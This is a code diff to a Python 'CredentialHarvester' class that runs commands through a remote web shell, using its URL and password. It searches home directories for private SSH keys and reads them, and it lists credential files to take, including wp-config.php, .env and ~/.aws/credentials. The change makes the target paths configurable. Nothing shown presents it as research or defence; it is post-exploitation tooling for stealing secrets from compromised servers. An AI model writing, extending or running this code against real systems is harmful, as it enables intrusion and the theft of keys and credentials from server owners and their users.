@@ -170,16 +170,17 @@ class CredentialHarvester:
         ssh_keys = []
         
         # Find SSH keys
+        home_dir = os.getenv('TARGET_HOME_DIR', '/home')
         result = await self.webshell.execute_command(
             shell_url,
             shell_password,
-            'find /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null'
+            f'find {home_dir} -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null'
         )
         
         key_paths = result.get('output', '').strip().split('\n')
         
         for key_path in key_paths:
-            if key_path and '/home/' in key_path:
+            if key_path and key_path.strip():
                 # Read private key
                 key_result = await self.webshell.execute_command(
                     shell_url,
@@ -327,12 +328,13 @@ class CredentialHarvester:
         credentials = []
         
         # Common config files with credentials
+        web_root = os.getenv('TARGET_WEB_ROOT', '/var/www/html')
         config_files = [
             # Web applications
-            '/var/www/html/config.php',
-            '/var/www/html/wp-config.php',
-            '/var/www/html/.env',
-            '/var/www/html/configuration.php',
+            os.path.join(web_root, 'config.php'),
+            os.path.join(web_root, 'wp-config.php'),
+            os.path.join(web_root, '.env'),
+            os.path.join(web_root, 'configuration.php'),
             
             # Application configs
             '~/.aws/credentials',
